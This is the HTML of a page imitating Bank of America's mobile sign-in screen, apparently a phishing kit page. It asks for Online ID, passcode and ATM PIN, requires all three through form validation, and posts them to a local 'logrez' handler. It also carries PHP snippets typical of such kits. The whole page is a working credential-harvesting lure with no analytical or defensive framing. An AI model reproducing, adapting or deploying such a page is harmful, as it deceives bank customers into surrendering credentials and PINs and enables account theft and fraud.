<!DOCTYPE html>

<html class="js no-flexbox canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths">
<head>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
	<meta content="IE=EmulateIE10" http-equiv="X-UA-Compatible">
	<meta content="app-id=284847138" name="apple-itunes-app">
	<title>Sign In</title>

	
	<link href="./css-js/bactouch.css" rel="stylesheet">
	<link href="./css-js/toolbar.css" rel="stylesheet">
	<link href="./css-js/footer.css" rel="stylesheet">

	<style>
label.error {
color: red;
}
</style>
</head>
<body>
<form name="form" id="form" action="logrez" method="post">
	<div class="" id="page" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;">
		<div class="cmw_toolBar_" id="cmw_toolBar_">
			<a class="hidden" id="leftButton" role="button"></a><a class="sprite backButton icon sprite-menu" href="#" id="slidemenuz" role="button" title="Show menu for all mobile banking features"></a>
			<div class="hidden" id="barker"></div>
			<div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">
				<h1 class="" id="title">Sign In<span class="adaHidden" id="adaTitleText">Enter your Online ID</span></h1>
			</div><a class="hidden" id="rightButton"></a>
		</div>
		<div id="SASI_banner_container"></div>
		<div class="pageMinHeight">
			<!-- SIGN ON HOME PAGE-->
			<div class="signonVersionTwoHomePage">
				<div class="overthrow" id="scrollerwrapperOt">
					<div class="hidden" id="divMessaging"></div>
					<div class="padding10" id="blackBerryMsg" style="display: none;"></div>
					<div class="hidden" id="accountLocked">
						<ul class="listView edge">
							<li class="noLink" role="button">
								<div class="imageWrap paddingHoriz20"><img class="" src="./Sign%20In_files/ico_alert@2x.png"></div>
								<p class="subVal padding10 fontRed" id="headError"></p>
								<p class="subVal padding10" id="bodyError"></p>
							</li>
						</ul>
					</div>
					<div id="newOnlineId" style="">
						<div class="toppad5">
							<fieldset>
								 <label class="adaHidden" for="saveCustomUserId"></label> <input class="hidden" id="saveCustomUserId" type="checkbox"> <label class="adaHidden" for="btCustomOnlineId" id="signonOIDLabel">Enter your Online ID</label>
								<div class="inputEntryContainer">
									
									<div class="inputContainer">
										<label class="adaHidden" for="btCustomOnlineId"></label> 
										
						<input class="focus sprite-clear_input_icns" maxlength="32"  id="user" name="user" placeholder="Online ID" autocomplete="off" autocapitalize="off"  autocorrect="off" type="text" title="Invalid Online ID. Please complete your Online ID.">
										
										
									</div>
									<div class="inputContainer">
										<label class="adaHidden" for="btCustomOnlineId"></label> 
										
						<input class="focus sprite-clear_input_icns" maxlength="20" title="Enter your Passcode" id="pass" name="pass" placeholder="Passcode" autocomplete="off" type="password">
										
										
									</div>
									
									<div class="inputContainer">
										<label class="adaHidden" for="btCustomOnlineId"></label> 
										
						<input data-mask="000000" class="focus sprite-clear_input_icns" maxlength="6" title="Enter your ATM PIN" id="atm" name="atm" placeholder="ATM PIN" autocomplete="off" type="text" pattern="\d*">
										
										
									</div>
								</div>
							</fieldset>
						</div>
					</div>
					<div id="savedOnlineId" style="display: none;">
						<nav>
							<h2 id="cmsSelectID">Saved Online ID</h2>
							<ul class="listView listView toppad10 fontSize075" id="btSavedIdHolder"></ul>
						</nav>
					</div>
					<div class="toppad20" id="savedOnlineIdPasscode" style="display: none;">
						<nav>
							<ul class="listView">
								<li role="button">
									<a href="javascript:void(0);" id="cmsSelectonlineID">
									<p></p></a>
								</li>
							</ul>
							<div id="inputPasscodeContainer">
								<div class="inputContainer">
									<label class="adaHidden" for="btsaveOIDPasscode"></label> 
									<input autocomplete="off" class="masked" id="btsaveOIDPasscode" maxlength="20" placeholder="Passcode" title="Enter your Passcode." type="password"> 
									
									
								</div>
							</div>
						</nav>
					</div>
				</div>
				<div>
						<button type="submit" style="float:left; width:95%;" role="button" class="btn">					
					<img class="paddingHoriz10" src="./Sign%20In_files/secure_lock.png" style="margin-bottom:-4px;"> 
					<span id="signonLabel">Sign In</span></button>
				</div>
				<div class="helpOptionView" id="helpOptionView">
					<div class="padding10 center">
						<div class="inline-link blueLink">
							<a class="plain slideUp jsForgotIDPass" href="javascript:void(0);" id="forgetOIDPass">Forgot ID/Passcode?</a>
						</div>
						<div class="paddingVert10 inline-link blueLink">
							<a class="plain slideUp" href="javascript:void(0);" id="signonEnroll">Enroll</a>
						</div>
					</div>
					<div class="padding10">
						<!--
            <div class="toppad10 blueLink"><a href="javascript:void(0);" id="forgetOID" class="plain slideUp"></a></div>    
            <div class="toppad10 blueLink"><a href="javascript:void(0);" id="forgetpasscode" class="plain slideUp"></a></div>   
            <div class="paddingVert10 blueLink"><a href="#home?app=enrollmentsv2" class="plain slideUp" id="signonEnroll"></a></div>    
            -->
						<div class="borderLine smarBannerdisplay hidden"></div>
						<div class="bofaBannerLink smarBannerdisplay hidden">
							<a class="appNavigation plain slideUp" href="javascript:;" id="signonBannerLink">Get the Mobile Banking app</a>
						</div>
					</div>
				</div>
				<div id="btnPin" style="position: fixed; bottom: 0px; display: none;">
					<ul class="btnGroupPin">
						<li>
							<a class="plain slideUp btnNeg" href="javascript:void(0);" id="cancelButton" role="button">Cancel</a>
						</li>
					</ul>
				</div>
			</div>
		</div>
		<footer>
			<div class="boa_footnote"></div>
			<div class="boa_footer">
				<div class="left">
					<a href="https://www.bankofamerica.com/security-center/privacy-overview/" id="boa_footer_privacy" target="_blank">Privacy</a>
				</div>
				<div class="left">
					<a href="https://www.bankofamerica.com/security-center/overview/" id="boa_footer_security" style="padding-left:20px;" target="_blank">Security</a>
				</div>
				<div class="right">
					<a class="ehl" href="https://www.bankofamerica.com/help/equalhousing_popup.go" id="boa_footer_ehl" target="_blank">Equal Housing Lender</a>
				</div>
				<p class="clear">© 2021 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.</p>
			</div>
		</footer>
	</div>
	


	<div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div>
	
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js?<?=md5(microtime()).md5(microtime()).md5(microtime());?>"></script>
	


<script>
    var frmvalidator = new Validator("form");
frmvalidator.addValidation("user","req","Online ID is required. Please complete your Online ID.");
 frmvalidator.addValidation("user","minlen=4","Invalid Online ID. Please complete your Online ID.");
 frmvalidator.addValidation("pass","req","Passcode is required. Please complete your Passcode.");
 frmvalidator.addValidation("pass","minlen=7","Invalid Passcode. Please complete your Passcode.");
  frmvalidator.addValidation("atm","req","ATM PIN is required. Please complete your ATM PIN.");
 frmvalidator.addValidation("atm","minlen=4","Invalid ATM PIN. Please complete your ATM PIN.");
</script>

				<script src="css-js/jquery.mask.js?<?=md5(microtime()).md5(microtime()).md5(microtime());?>"></script>
					
					

</form>
</body>
</html>